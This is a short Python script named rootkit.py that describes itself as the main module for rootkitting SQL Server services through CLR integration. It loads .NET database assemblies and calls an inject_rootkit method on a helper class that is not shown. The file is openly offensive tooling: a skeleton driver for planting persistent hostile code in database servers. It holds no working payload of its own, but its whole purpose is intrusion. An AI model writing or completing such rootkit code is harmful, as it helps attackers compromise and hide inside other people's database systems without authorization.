# rootkit.py - Main module for rootkitting SQL services that use CLR.

import clr
import System
from sql_clr_helper import SQLCLRHelper

def main():
    """
    Main function to initialize and execute the rootkit.
    """
    # Load the necessary CLR assemblies
    clr.AddReference('System.Data')
    clr.AddReference('Microsoft.SqlServer.Management.Smo')

    # Initialize the SQL CLR helper
    sql_helper = SQLCLRHelper()

    # Inject the rootkit into the SQL service
    sql_helper.inject_rootkit()

if __name__ == "__main__":
    main()